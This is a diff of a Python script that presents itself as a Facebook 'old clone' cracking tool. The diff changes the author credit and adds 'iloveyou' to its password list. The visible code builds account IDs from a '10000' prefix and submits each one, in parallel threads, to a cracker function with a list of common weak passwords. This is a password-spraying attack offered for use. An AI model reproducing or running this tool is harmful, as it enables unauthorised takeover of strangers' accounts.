@@ -1,4 +1,4 @@
-"""@coded_by : shishir ahmed"""
+"""@coded_by : Md.Taif"""
 from concurrent.futures import ThreadPoolExecutor as tred
 import requests,sys
 from os import system as cmd
@@ -14,14 +14,14 @@ logo = """
   \_/\_| |_/\___/\_|    
                         
                         
-  \n⋙ Author   :  TAIF-404\n⋙ Facebook :  TAIF\n---------------------------------------"""
+  \n⋙ Author   :  TAIF-404\n⋙ Facebook : Md.Taif&Rahat \n---------------------------------------"""
 loop,ok=0,0
 class Hacker:
     def _____(self) -> None:
       self.sex=""
     def main(self) :
        self.clear()
-       print("⋙ 1. Old Clone 2009-20014\n⋙ 2. Exit Menu");self.linex()
+       print("⋙ 1. Old Clone 2009-2014\n⋙ 2. Exit Menu");self.linex()
        self.frsc=input("⋙ Select : ")
        if self.frsc == "1":self.settings()
        else:exit("⋙ Thanks For Using !")
@@ -36,7 +36,7 @@ class Hacker:
            print("⋙ Total Uid : %s"%(total))
            print("⋙ Use Data For Best Result ");self.linex()
            for xd in self.user:
-               uid=str("10000"+xd);pas=['123456','1234567','12345678','123456789','123123','12341234']
+               uid=str("10000"+xd);pas=['123456','1234567','12345678','123456789','123123','12341234','iloveyou']
                kidz.submit(self.cracker,uid,pas,total)
        print();self.linex();print("⋙ Cracking Complete \n⋙ Total OK : %s"%(ok))
        self.linex();input("⋙ Prees Enter To Exit ");exit()
